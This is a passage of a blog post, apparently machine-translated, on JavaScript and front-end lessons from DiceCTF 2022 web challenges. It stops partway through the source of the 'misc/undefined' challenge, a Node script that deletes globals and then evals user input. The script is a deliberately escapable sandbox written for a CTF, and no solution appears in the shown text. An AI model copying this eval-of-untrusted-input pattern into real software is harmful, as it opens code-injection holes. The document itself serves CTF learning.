<!DOCTYPE html>
<html class="has-navbar-fixed-top" lang="en">
<head>
    <meta charset="utf-8">
<title>Various JS and Front-end Tips I Learned from DiceCTF 2022 - Huli&#39;s blog</title>
<meta name="viewport" content="width=device-width, initial-scale=1">


<link href="https://blog.huli.tw/2022/02/08/en/what-i-learned-from-dicectf-2022/" rel="alternate" hreflang="en" />


<link href="https://blog.huli.tw/2022/02/08/what-i-learned-from-dicectf-2022/" rel="alternate" hreflang="x-default" />


            
<link href="https://blog.huli.tw/2022/02/08/what-i-learned-from-dicectf-2022/" rel="alternate" hreflang="zh-TW" />
            





    
<link rel="canonical" href="https://blog.huli.tw/2022/02/08/en/what-i-learned-from-dicectf-2022/">
    





    <meta name="description" content="If you don’t know what CTF is, you can refer to my previous article: How to Get Started with Web Challenges in CTF?, which briefly introduces what CTF is and some basic types of challenges. I played D">
<meta property="og:type" content="article">
<meta property="og:title" content="Various JS and Front-end Tips I Learned from DiceCTF 2022">
<meta property="og:url" content="https://blog.huli.tw/2022/02/08/en/what-i-learned-from-dicectf-2022/index.html">
<meta property="og:site_name" content="Huli&#39;s blog">
<meta property="og:description" content="If you don’t know what CTF is, you can refer to my previous article: How to Get Started with Web Challenges in CTF?, which briefly introduces what CTF is and some basic types of challenges. I played D">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://blog.huli.tw/img/what-i-learned-from-dicectf-2022/cover-en.png">
<meta property="article:published_time" content="2022-02-08T12:58:50.000Z">
<meta property="article:modified_time" content="2023-06-20T05:46:56.933Z">
<meta property="article:author" content="Huli">
<meta property="article:tag" content="Front-end">
<meta property="article:tag" content="JavaScript">
<meta property="article:tag" content="Security">
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:image" content="https://blog.huli.tw/img/what-i-learned-from-dicectf-2022/cover-en.png">



<link rel="alternative" href="/atom.xml" title="Various JS and Front-end Tips I Learned from DiceCTF 2022" type="application/atom+xml">



<link rel="icon" href="/img/lidemy_logo.png">


<link rel="stylesheet" href="//fonts.googleapis.com/css?family=Ovo|Source+Code+Pro">


<link rel="stylesheet" href="/css/bulma.css?v=2.css">



<link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/lightgallery/1.6.8/css/lightgallery.min.css">


<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism-tomorrow.min.css" />
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/plugins/line-numbers/prism-line-numbers.min.css" />


<link rel="stylesheet" href="/css/style.css?v=4.css">





    
    
    
    
    
    
    
    
    
    
<script async src="https://www.googletagmanager.com/gtag/js?id=G-1393J2EVCZ"></script>
<script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'G-1393J2EVCZ');
</script>


    


<meta name="generator" content="Hexo 6.3.0"></head>
<body>
    <script>
        if (localStorage.getItem('dark-mode')) {
            if (localStorage.getItem('dark-mode') === 'true') {
                document.body.classList.add('dark-mode')
            }
        } else {
            if (window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches) {
                document.body.classList.add('dark-mode')
            }
        }
    </script>
    
<nav class="navbar is-transparent is-fixed-top navbar-main" role="navigation" aria-label="main navigation">
    <div class="container">
        <div class="navbar-brand">
            <a class="navbar-item navbar-logo" href="/en">
                
                    
                    Huli&#39;s blog
                    
                
            </a>
            <div class="navbar-burger">
                <span></span>
                <span></span>
                <span></span>
            </div>
        </div>
        
        <div class="navbar-menu navbar-start">
            
            <a class="navbar-item "
               href="/en/archives">Archive</a>
            
            <a class="navbar-item "
               href="/en/categories">Categories</a>
            
            <a class="navbar-item "
               href="/en/about">About</a>
            
        </div>
        
        <div class="navbar-menu navbar-end">
            
            
            <div class="navbar-item is-hoverable has-dropdown is-hidden-mobile is-hidden-tablet-only toc">
                <a class="navbar-item" title="Table of Contents">
                    Table of Contents
                </a>
                <div class="navbar-dropdown">
                    
                    
                    
                    
                    <a class="navbar-item" href="#miscx2fundefined55-solves">1&nbsp;&nbsp;<b>misc/undefined(55 solves)</b></a>
                    
                    
                    <hr class="navbar-divider">
                    
                    
                    <a class="navbar-item" href="#webx2fblazingfast75-solves">2&nbsp;&nbsp;<b>web/blazingfast(75 solves)</b></a>
                    
                    
                    <hr class="navbar-divider">
                    
                    
                    <a class="navbar-item" href="#webx2fno-cookies5-solves">3&nbsp;&nbsp;<b>web/no-cookies(5 solves)</b></a>
                    
                    
                    
                    <a class="navbar-item" href="#unexpected-solution">3.1&nbsp;&nbsp;Unexpected solution</a>
                    
                    
                    <hr class="navbar-divider">
                    
                    
                    <a class="navbar-item" href="#webx2fvm-calc2-solves">4&nbsp;&nbsp;<b>web/vm-calc(2 solves)</b></a>
                    
                    
                    <hr class="navbar-divider">
                    
                    
                    <a class="navbar-item" href="#webx2fnotekeeper2-solves">5&nbsp;&nbsp;<b>web/noteKeeper(2 solves)</b></a>
                    
                    
                    <hr class="navbar-divider">
                    
                    
                    <a class="navbar-item" href="#webx2fdicevault2-solves">6&nbsp;&nbsp;<b>web/dicevault(2 solves)</b></a>
                    
                    
                    <hr class="navbar-divider">
                    
                    
                    <a class="navbar-item" href="#webx2fcarrot1-solves">7&nbsp;&nbsp;<b>web/carrot(1 solves)</b></a>
                    
                    
                    <hr class="navbar-divider">
                    
                    
                    <a class="navbar-item" href="#webx2fshadow0-solves">8&nbsp;&nbsp;<b>web/shadow(0 solves)</b></a>
                    
                    
                    <hr class="navbar-divider">
                    
                    
                    <a class="navbar-item" href="#conclusion">9&nbsp;&nbsp;<b>Conclusion</b></a>
                    
                </div>
            </div>
            
            
            <a class="navbar-item" target="_blank" title="Twitter" href="https://twitter.com/aszx87410">
                
                <i class="fab fa-twitter"></i>
                
            </a>
               
            <a class="navbar-item" target="_blank" title="RSS" href="/atom-en.xml">
                
                <i class="fas fa-rss"></i>
                
            </a>
               
            
            <a class="navbar-item btn-dark-mode" title="dark-mode" href="#">
                <div>
                    <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1" width="15" height="15" viewBox="0 0 256 256" xml:space="preserve">
                    <defs>
                    </defs>
                    <g style="stroke: none; stroke-width: 0; stroke-dasharray: none; stroke-linecap: butt; stroke-linejoin: miter; stroke-miterlimit: 10; fill: none; fill-rule: nonzero; opacity: 1;" transform="translate(1.4065934065934016 1.4065934065934016) scale(2.81 2.81)" >
                        <path d="M 87.823 60.7 c -0.463 -0.423 -1.142 -0.506 -1.695 -0.214 c -15.834 8.398 -35.266 2.812 -44.232 -12.718 c -8.966 -15.53 -4.09 -35.149 11.101 -44.665 c 0.531 -0.332 0.796 -0.963 0.661 -1.574 c -0.134 -0.612 -0.638 -1.074 -1.259 -1.153 c -9.843 -1.265 -19.59 0.692 -28.193 5.66 C 13.8 12.041 6.356 21.743 3.246 33.35 S 1.732 57.08 7.741 67.487 c 6.008 10.407 15.709 17.851 27.316 20.961 C 38.933 89.486 42.866 90 46.774 90 c 7.795 0 15.489 -2.044 22.42 -6.046 c 8.601 -4.966 15.171 -12.43 18.997 -21.586 C 88.433 61.79 88.285 61.123 87.823 60.7 z" style="stroke: none; stroke-width: 1; stroke-dasharray: none; stroke-linecap: butt; stroke-linejoin: miter; stroke-miterlimit: 10; fill: #ffa716; fill-rule: nonzero; opacity: 1;" transform=" matrix(1 0 0 1 0 0) " stroke-linecap="round" />
                    </g>
                    </svg>
                </div>
            </a>
            
               <a class="navbar-item" href="/2022/02/08/what-i-learned-from-dicectf-2022/">中文</a>
            
            

        </div>
    </div>
</nav>

    <section class="section">
    <div class="container">
      
      <div data-nosnippet class="self-notice">
        If you have any thoughts on my blog or articles and you want to let me know, you can either post a comment below(public) or tell me via this <a href="https://forms.gle/SjJZ4cnNs6NnjXQG8" target="_blank">feedback form</a>
      </div>
      
    <article class="article content gallery" itemscope itemprop="blogPost">
    <h1 class="article-title is-size-3 is-size-4-mobile" itemprop="name">
        
            Various JS and Front-end Tips I Learned from DiceCTF 2022
        
    </h1>
    <div class="article-meta columns is-variable is-1 is-multiline is-mobile is-size-7-mobile">
        <span class="column is-narrow">
            <time datetime="2022-02-08T12:58:50.000Z" itemprop="datePublished">8 February 2022</time>
        </span>
        
        <span class="column is-narrow article-category">
            <i class="far fa-folder"></i>
            <a class="article-category-link" href="/en/categories/Security/">Security</a>
        </span>
        
        
        
        <spen data-nosnippet class="column is-narrow">(Translated by ChatGPT)</span>
        
    </div>
    
    <div class="article-entry is-size-6-mobile" itemprop="articleBody">
    
        <p>If you don’t know what CTF is, you can refer to my previous article: <a target="_blank" rel="noopener" href="https://blog.techbridge.cc/2021/02/20/web-ctf-is-fun/">How to Get Started with Web Challenges in CTF?</a>, which briefly introduces what CTF is and some basic types of challenges.</p>
<p>I played DiceCTF 2021 seriously last year and finally solved 6 web challenges. My experience is here: <a target="_blank" rel="noopener" href="https://github.com/aszx87410/ctf-writeups/issues/20">DiceCTF 2021 - Summary</a>. I took a look at this year’s DiceCTF and was completely shocked. The difficulty level is completely different.</p>
<p>There are a total of 10 web challenges this time, with 1 easy challenge solved by 365 teams, another relatively simple one solved by 75 teams, and the other 8 challenges solved by only 5 teams or less, with one of them unsolved.</p>
<p>As a person who likes web and JS-related tips, this is a great learning opportunity to learn various techniques through the <a target="_blank" rel="noopener" href="https://hackmd.io/fmdfFQ2iS6yoVpbR3KCiqQ">writeup</a> released after the competition. There won’t be notes on all web challenges below, only the ones I’m interested in.</p>
<span id="more"></span>

<h2><span id="miscx2fundefined55-solves">misc&#x2F;undefined(55 solves)</span></h2><p>There is also a JS-related challenge in the misc category this time, and the challenge description is as follows:</p>
<blockquote>
<p>I was writing some Javascript when everything became undefined…</p>
<p>Can you create something out of nothing and read the flag at &#x2F;flag.txt? Tested for Node version 17.</p>
</blockquote>
<p>The source code looks like this:</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token hashbang comment">#!/usr/local/bin/node</span>
<span class="token comment">// don't mind the ugly hack to read input</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"What do you want to run?"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">let</span> inpBuf <span class="token operator">=</span> Buffer<span class="token punctuation">.</span><span class="token function">alloc</span><span class="token punctuation">(</span><span class="token number">2048</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">const</span> input <span class="token operator">=</span> inpBuf<span class="token punctuation">.</span><span class="token function">slice</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">"fs"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">readSync</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> inpBuf<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token string">"utf8"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
inpBuf <span class="token operator">=</span> <span class="token keyword">undefined</span><span class="token punctuation">;</span>

<span class="token class-name">Function</span><span class="token punctuation">.</span>prototype<span class="token punctuation">.</span>constructor <span class="token operator">=</span> <span class="token keyword">undefined</span><span class="token punctuation">;</span>
<span class="token punctuation">(</span><span class="token keyword">async</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">.</span>constructor<span class="token punctuation">.</span>prototype<span class="token punctuation">.</span>constructor <span class="token operator">=</span> <span class="token keyword">undefined</span><span class="token punctuation">;</span>
<span class="token punctuation">(</span><span class="token keyword">function</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">.</span>constructor<span class="token punctuation">.</span>prototype<span class="token punctuation">.</span>constructor <span class="token operator">=</span> <span class="token keyword">undefined</span><span class="token punctuation">;</span>
<span class="token punctuation">(</span><span class="token keyword">async</span> <span class="token keyword">function</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">.</span>constructor<span class="token punctuation">.</span>prototype<span class="token punctuation">.</span>constructor <span class="token operator">=</span> <span class="token keyword">undefined</span><span class="token punctuation">;</span>

<span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">const</span> key <span class="token keyword">of</span> Object<span class="token punctuation">.</span><span class="token function">getOwnPropertyNames</span><span class="token punctuation">(</span>global<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">"global"</span><span class="token punctuation">,</span> <span class="token string">"console"</span><span class="token punctuation">,</span> <span class="token string">"eval"</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">includes</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">continue</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    global<span class="token punctuation">[</span>key<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token keyword">undefined</span><span class="token punctuation">;</span>
    <span class="token keyword">delete</span> global<span class="token punctuation">[</span>key<span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">delete</span> global<span class="token punctuation">.</span>global<span class="token punctuation">;</span>
process <span class="token operator">=</span> <span class="token keyword">undefined</span><span class="token punctuation">;</span>

<span class="token punctuation">&#123;</span>
    <span class="token keyword">let</span> AbortController<span class="token operator">=</span><span class="token keyword">undefined</span><span class="token punctuation">;</span><span class="token keyword">let</span> AbortSignal<span class="token operator">=</span><span class="token keyword">undefined</span><span class="token punctuation">;</span>
    <span class="token keyword">let</span> AggregateError<span class="token operator">=</span><span class="token keyword">undefined</span><span class="token punctuation">;</span><span class="token keyword">let</span> Array<span class="token operator">=</span><span class="token keyword">undefined</span><span class="token punctuation">;</span>
    <span class="token keyword">let</span> ArrayBuffer<span class="token operator">=</span><span class="token keyword">undefined</span><span class="token punctuation">;</span><span class="token keyword">let</span> Atomics<span class="token operator">=</span><span class="token keyword">undefined</span><span class="token punctuation">;</span>
    <span class="token keyword">let</span> BigInt<span class="token operator">=</span><span class="token keyword">undefined</span><span class="token punctuation">;</span><span class="token keyword">let</span> BigInt64Array<span class="token operator">=</span><span class="token keyword">undefined</span><span class="token punctuation">;</span>
    <span class="token keyword">let</span> BigUint64Array<span class="token operator">=</span><span class="token keyword">undefined</span><span class="token punctuation">;</span><span class="token keyword">let</span> Boolean<span class="token operator">=</span><span class="token keyword">undefined</span><span class="token punctuation">;</span>
    <span class="token keyword">let</span> Buffer<span class="token operator">=</span><span class="token keyword">undefined</span><span class="token punctuation">;</span><span class="token keyword">let</span> DOMException<span class="token operator">=</span><span class="token keyword">undefined</span><span class="token punctuation">;</span>
    <span class="token keyword">let</span> DataView<span class="token operator">=</span><span class="token keyword">undefined</span><span class="token punctuation">;</span><span class="token keyword">let</span> Date<span class="token operator">=</span><span class="token keyword">undefined</span><span class="token punctuation">;</span>
    <span class="token keyword">let</span> Error<span class="token operator">=</span><span class="token keyword">undefined</span><span class="token punctuation">;</span><span class="token keyword">let</span> EvalError<span class="token operator">=</span><span class="token keyword">undefined</span><span class="token punctuation">;</span>
    <span class="token keyword">let</span> Event<span class="token operator">=</span><span class="token keyword">undefined</span><span class="token punctuation">;</span><span class="token keyword">let</span> EventTarget<span class="token operator">=</span><span class="token keyword">undefined</span><span class="token punctuation">;</span>
    <span class="token keyword">let</span> FinalizationRegistry<span class="token operator">=</span><span class="token keyword">undefined</span><span class="token punctuation">;</span>
    <span class="token keyword">let</span> Float32Array<span class="token operator">=</span><span class="token keyword">undefined</span><span class="token punctuation">;</span><span class="token keyword">let</span> Float64Array<span class="token operator">=</span><span class="token keyword">undefined</span><span class="token punctuation">;</span>
    <span class="token keyword">let</span> Function<span class="token operator">=</span><span class="token keyword">undefined</span><span class="token punctuation">;</span><span class="token keyword">let</span> <span class="token number">Infinity</span><span class="token operator">=</span><span class="token keyword">undefined</span><span class="token punctuation">;</span><span class="token keyword">let</span> Int16Array<span class="token operator">=</span><span class="token keyword">undefined</span><span class="token punctuation">;</span>
    <span class="token keyword">let</span> Int32Array<span class="token operator">=</span><span class="token keyword">undefined</span><span class="token punctuation">;</span><span class="token keyword">let</span> __dirname<span class="token operator">=</span><span class="token keyword">undefined</span><span class="token punctuation">;</span><span class="token keyword">let</span> Int8Array<span class="token operator">=</span><span class="token keyword">undefined</span><span class="token punctuation">;</span>
    <span class="token keyword">let</span> Intl<span class="token operator">=</span><span class="token keyword">undefined</span><span class="token punctuation">;</span><span class="token keyword">let</span> <span class="token constant">JSON</span><span class="token operator">=</span><span class="token keyword">undefined</span><span class="token punctuation">;</span><span class="token keyword">let</span> Map<span class="token operator">=</span><span class="token keyword">undefined</span><span class="token punctuation">;</span>
    <span class="token keyword">let</span> Math<span class="token operator">=</span><span class="token keyword">undefined</span><span class="token punctuation">;</span><span class="token keyword">let</span> MessageChannel<span class="token operator">=</span><span class="token keyword">undefined</span><span class="token punctuation">;</span><span class="token keyword">let</span> MessageEvent<span class="token operator">=</span><span class="token keyword">undefined</span><span class="token punctuation">;</span>
    <span class="token keyword">let</span> MessagePort<span class="token operator">=</span><span class="token keyword">undefined</span><span class="token punctuation">;</span><span class="token keyword">let</span> <span class="token number">NaN</span><span class="token operator">=</span><span class="token keyword">undefined</span><span class="token punctuation">;</span><span class="token keyword">let</span> Number<span class="token operator">=</span><span class="token keyword">undefined</span><span class="token punctuation">;</span>
    <span class="token keyword">let</span> Object<span class="token operator">=</span><span class="token keyword">undefined</span><span class="token punctuation">;</span><span class="token keyword">let</span> Promise<span class="token operator">=</span><span class="token keyword">undefined</span><span class="token punctuation">;</span><span class="token keyword">let</span> Proxy<span class="token operator">=</span><span class="token keyword">undefined</span><span class="token punctuation">;</span>
    <span class="token keyword">let</span> RangeError<span class="token operator">=</span><span class="token keyword">undefined</span><span class="token punctuation">;</span><span class="token keyword">let</span> ReferenceError<span class="token operator">=</span><span class="token keyword">undefined</span><span class="token punctuation">;</span><span class="token keyword">let</span> Reflect<span class="token operator">=</span><span class="token keyword">undefined</span><span class="token punctuation">;</span>
    <span class="token keyword">let</span> RegExp<span class="token operator">=</span><span class="token keyword">undefined</span><span class="token punctuation">;</span><span class="token keyword">let</span> Set<span class="token operator">=</span><span class="token keyword">undefined</span><span class="token punctuation">;</span><span class="token keyword">let</span> SharedArrayBuffer<span class="token operator">=</span><span class="token keyword">undefined</span><span class="token punctuation">;</span>
    <span class="token keyword">let</span> String<span class="token operator">=</span><span class="token keyword">undefined</span><span class="token punctuation">;</span><span class="token keyword">let</span> Symbol<span class="token operator">=</span><span class="token keyword">undefined</span><span class="token punctuation">;</span><span class="token keyword">let</span> SyntaxError<span class="token operator">=</span><span class="token keyword">undefined</span><span class="token punctuation">;</span>
    <span class="token keyword">let</span> TextDecoder<span class="token operator">=</span><span class="token keyword">undefined</span><span class="token punctuation">;</span><span class="token keyword">let</span> TextEncoder<span class="token operator">=</span><span class="token keyword">undefined</span><span class="token punctuation">;</span><span class="token keyword">let</span> TypeError<span class="token operator">=</span><span class="token keyword">undefined</span><span class="token punctuation">;</span>
    <span class="token keyword">let</span> URIError<span class="token operator">=</span><span class="token keyword">undefined</span><span class="token punctuation">;</span><span class="token keyword">let</span> <span class="token constant">URL</span><span class="token operator">=</span><span class="token keyword">undefined</span><span class="token punctuation">;</span><span class="token keyword">let</span> URLSearchParams<span class="token operator">=</span><span class="token keyword">undefined</span><span class="token punctuation">;</span>
    <span class="token keyword">let</span> Uint16Array<span class="token operator">=</span><span class="token keyword">undefined</span><span class="token punctuation">;</span><span class="token keyword">let</span> Uint32Array<span class="token operator">=</span><span class="token keyword">undefined</span><span class="token punctuation">;</span><span class="token keyword">let</span> Uint8Array<span class="token operator">=</span><span class="token keyword">undefined</span><span class="token punctuation">;</span>
    <span class="token keyword">let</span> Uint8ClampedArray<span class="token operator">=</span><span class="token keyword">undefined</span><span class="token punctuation">;</span><span class="token keyword">let</span> WeakMap<span class="token operator">=</span><span class="token keyword">undefined</span><span class="token punctuation">;</span><span class="token keyword">let</span> WeakRef<span class="token operator">=</span><span class="token keyword">undefined</span><span class="token punctuation">;</span>
    <span class="token keyword">let</span> WeakSet<span class="token operator">=</span><span class="token keyword">undefined</span><span class="token punctuation">;</span><span class="token keyword">let</span> WebAssembly<span class="token operator">=</span><span class="token keyword">undefined</span><span class="token punctuation">;</span><span class="token keyword">let</span> _<span class="token operator">=</span><span class="token keyword">undefined</span><span class="token punctuation">;</span>
    <span class="token keyword">let</span> exports<span class="token operator">=</span><span class="token keyword">undefined</span><span class="token punctuation">;</span><span class="token keyword">let</span> _error<span class="token operator">=</span><span class="token keyword">undefined</span><span class="token punctuation">;</span><span class="token keyword">let</span> assert<span class="token operator">=</span><span class="token keyword">undefined</span><span class="token punctuation">;</span>
    <span class="token keyword">let</span> async_hooks<span class="token operator">=</span><span class="token keyword">undefined</span><span class="token punctuation">;</span><span class="token keyword">let</span> atob<span class="token operator">=</span><span class="token keyword">undefined</span><span class="token punctuation">;</span><span class="token keyword">let</span> btoa<span class="token operator">=</span><span class="token keyword">undefined</span><span class="token punctuation">;</span>
    <span class="token keyword">let</span> buffer<span class="token operator">=</span><span class="token keyword">undefined</span><span class="token punctuation">;</span><span class="token keyword">let</span> child_process<span class="token operator">=</span><span class="token keyword">undefined</span><span class="token punctuation">;</span><span class="token keyword">let</span> clearImmediate<span class="token operator">=</span><span class="token keyword">undefined</span><span class="token punctuation">;</span>
    <span class="token keyword">let</span> clearInterval<span class="token operator">=</span><span class="token keyword">undefined</span><span class="token punctuation">;</span><span class="token keyword">let</span> clearTimeout<span class="token operator">=</span><span class="token keyword">undefined</span><span class="token punctuation">;</span><span class="token keyword">let</span> cluster<span class="token operator">=</span><span class="token keyword">undefined</span><span class="token punctuation">;</span>
    <span class="token keyword">let</span> constants<span class="token operator">=</span><span class="token keyword">undefined</span><span class="token punctuation">;</span><span class="token keyword">let</span> crypto<span class="token operator">=</span><span class="token keyword">undefined</span><span class="token punctuation">;</span><span class="token keyword">let</span> decodeURI<span class="token operator">=</span><span class="token keyword">undefined</span><span class="token punctuation">;</span>
    <span class="token keyword">let</span> decodeURIComponent<span class="token operator">=</span><span class="token keyword">undefined</span><span class="token punctuation">;</span><span class="token keyword">let</span> dgram<span class="token operator">=</span><span class="token keyword">undefined</span><span class="token punctuation">;</span>
    <span class="token keyword">let</span> diagnostics_channel<span class="token operator">=</span><span class="token keyword">undefined</span><span class="token punctuation">;</span><span class="token keyword">let</span> dns<span class="token operator">=</span><span class="token keyword">undefined</span><span class="token punctuation">;</span><span class="token keyword">let</span> domain<span class="token operator">=</span><span class="token keyword">undefined</span><span class="token punctuation">;</span>
    <span class="token keyword">let</span> encodeURI<span class="token operator">=</span><span class="token keyword">undefined</span><span class="token punctuation">;</span><span class="token keyword">let</span> encodeURIComponent<span class="token operator">=</span><span class="token keyword">undefined</span><span class="token punctuation">;</span>
    <span class="token keyword">let</span> arguments<span class="token operator">=</span><span class="token keyword">undefined</span><span class="token punctuation">;</span><span class="token keyword">let</span> escape<span class="token operator">=</span><span class="token keyword">undefined</span><span class="token punctuation">;</span><span class="token keyword">let</span> events<span class="token operator">=</span><span class="token keyword">undefined</span><span class="token punctuation">;</span>
    <span class="token keyword">let</span> fs<span class="token operator">=</span><span class="token keyword">undefined</span><span class="token punctuation">;</span><span class="token keyword">let</span> global<span class="token operator">=</span><span class="token keyword">undefined</span><span class="token punctuation">;</span><span class="token keyword">let</span> globalThis<span class="token operator">=</span><span class="token keyword">undefined</span><span class="token punctuation">;</span>
    <span class="token keyword">let</span> http<span class="token operator">=</span><span class="token keyword">undefined</span><span class="token punctuation">;</span><span class="token keyword">let</span> http2<span class="token operator">=</span><span class="token keyword">undefined</span><span class="token punctuation">;</span><span class="token keyword">let</span> https<span class="token operator">=</span><span class="token keyword">undefined</span><span class="token punctuation">;</span>
    <span class="token keyword">let</span> inspector<span class="token operator">=</span><span class="token keyword">undefined</span><span class="token punctuation">;</span><span class="token keyword">let</span> isFinite<span class="token operator">=</span><span class="token keyword">undefined</span><span class="token punctuation">;</span><span class="token keyword">let</span> isNaN<span class="token operator">=</span><span class="token keyword">undefined</span><span class="token punctuation">;</span>
    <span class="token keyword">let</span> module<span class="token operator">=</span><span class="token keyword">undefined</span><span class="token punctuation">;</span><span class="token keyword">let</span> net<span class="token operator">=</span><span class="token keyword">undefined</span><span class="token punctuation">;</span><span class="token keyword">let</span> os<span class="token operator">=</span><span class="token keyword">undefined</span><span class="token punctuation">;</span><span class="token keyword">let</span> parseFloat<span class="token operator">=</span><span class="token keyword">undefined</span><span class="token punctuation">;</span>
    <span class="token keyword">let</span> parseInt<span class="token operator">=</span><span class="token keyword">undefined</span><span class="token punctuation">;</span><span class="token keyword">let</span> path<span class="token operator">=</span><span class="token keyword">undefined</span><span class="token punctuation">;</span><span class="token keyword">let</span> perf_hooks<span class="token operator">=</span><span class="token keyword">undefined</span><span class="token punctuation">;</span>
    <span class="token keyword">let</span> performance<span class="token operator">=</span><span class="token keyword">undefined</span><span class="token punctuation">;</span><span class="token keyword">let</span> process<span class="token operator">=</span><span class="token keyword">undefined</span><span class="token punctuation">;</span><span class="token keyword">let</span> punycode<span class="token operator">=</span><span class="token keyword">undefined</span><span class="token punctuation">;</span>
    <span class="token keyword">let</span> querystring<span class="token operator">=</span><span class="token keyword">undefined</span><span class="token punctuation">;</span><span class="token keyword">let</span> queueMicrotask<span class="token operator">=</span><span class="token keyword">undefined</span><span class="token punctuation">;</span><span class="token keyword">let</span> readline<span class="token operator">=</span><span class="token keyword">undefined</span><span class="token punctuation">;</span>
    <span class="token keyword">let</span> repl<span class="token operator">=</span><span class="token keyword">undefined</span><span class="token punctuation">;</span><span class="token keyword">let</span> require<span class="token operator">=</span><span class="token keyword">undefined</span><span class="token punctuation">;</span><span class="token keyword">let</span> setImmediate<span class="token operator">=</span><span class="token keyword">undefined</span><span class="token punctuation">;</span>
    <span class="token keyword">let</span> setInterval<span class="token operator">=</span><span class="token keyword">undefined</span><span class="token punctuation">;</span><span class="token keyword">let</span> __filename<span class="token operator">=</span><span class="token keyword">undefined</span><span class="token punctuation">;</span><span class="token keyword">let</span> setTimeout<span class="token operator">=</span><span class="token keyword">undefined</span><span class="token punctuation">;</span>
    <span class="token keyword">let</span> stream<span class="token operator">=</span><span class="token keyword">undefined</span><span class="token punctuation">;</span><span class="token keyword">let</span> string_decoder<span class="token operator">=</span><span class="token keyword">undefined</span><span class="token punctuation">;</span><span class="token keyword">let</span> structuredClone<span class="token operator">=</span><span class="token keyword">undefined</span><span class="token punctuation">;</span>
    <span class="token keyword">let</span> sys<span class="token operator">=</span><span class="token keyword">undefined</span><span class="token punctuation">;</span><span class="token keyword">let</span> timers<span class="token operator">=</span><span class="token keyword">undefined</span><span class="token punctuation">;</span><span class="token keyword">let</span> tls<span class="token operator">=</span><span class="token keyword">undefined</span><span class="token punctuation">;</span>
    <span class="token keyword">let</span> trace_events<span class="token operator">=</span><span class="token keyword">undefined</span><span class="token punctuation">;</span><span class="token keyword">let</span> tty<span class="token operator">=</span><span class="token keyword">undefined</span><span class="token punctuation">;</span><span class="token keyword">let</span> unescape<span class="token operator">=</span><span class="token keyword">undefined</span><span class="token punctuation">;</span>
    <span class="token keyword">let</span> url<span class="token operator">=</span><span class="token keyword">undefined</span><span class="token punctuation">;</span><span class="token keyword">let</span> util<span class="token operator">=</span><span class="token keyword">undefined</span><span class="token punctuation">;</span><span class="token keyword">let</span> v8<span class="token operator">=</span><span class="token keyword">undefined</span><span class="token punctuation">;</span><span class="token keyword">let</span> vm<span class="token operator">=</span><span class="token keyword">undefined</span><span class="token punctuation">;</span>
    <span class="token keyword">let</span> wasi<span class="token operator">=</span><span class="token keyword">undefined</span><span class="token punctuation">;</span><span class="token keyword">let</span> worker_threads<span class="token operator">=</span><span class="token keyword">undefined</span><span class="token punctuation">;</span><span class="token keyword">let</span> zlib<span class="token operator">=</span><span class="token keyword">undefined</span><span class="token punctuation">;</span>
    <span class="token keyword">let</span> __proto__<span class="token operator">=</span><span class="token keyword">undefined</span><span class="token punctuation">;</span><span class="token keyword">let</span> hasOwnProperty<span class="token operator">=</span><span class="token keyword">undefined</span><span class="token punctuation">;</span><span class="token keyword">let</span> isPrototypeOf<span class="token operator">=</span><span class="token keyword">undefined</span><span class="token punctuation">;</span>
    <span class="token keyword">let</span> propertyIsEnumerable<span class="token operator">=</span><span class="token keyword">undefined</span><span class="token punctuation">;</span><span class="token keyword">let</span> toLocaleString<span class="token operator">=</span><span class="token keyword">undefined</span><span class="token punctuation">;</span>
    <span class="token keyword">let</span> toString<span class="token operator">=</span><span class="token keyword">undefined</span><span class="token punctuation">;</span><span class="token keyword">let</span> valueOf<span class="token operator">=</span><span class="token keyword">undefined</span><span class="token punctuation">;</span>

    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token function">eval</span><span class="token punctuation">(</span>input<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
